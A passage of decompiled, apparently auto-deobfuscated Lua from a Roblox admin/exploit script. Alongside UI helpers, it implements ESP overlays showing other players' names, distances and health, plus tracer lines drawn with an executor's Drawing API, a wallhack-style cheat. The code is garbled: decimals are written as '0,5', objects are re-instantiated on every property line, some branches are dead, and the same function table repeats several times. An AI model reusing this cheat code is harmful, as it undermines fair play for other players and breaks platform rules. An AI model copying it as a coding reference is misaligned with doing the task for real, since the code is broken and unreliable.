              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.SetAllTrans((UI.ChatLogs:Clone()))
      UI.Commands.Visible = false
      UI.ChatLogs.Visible = false
      UI.ChatLogs:Clone().Visible = false
      UI.ChatLogs:Clone().Visible = false
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.Draggable(UI.Commands)
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
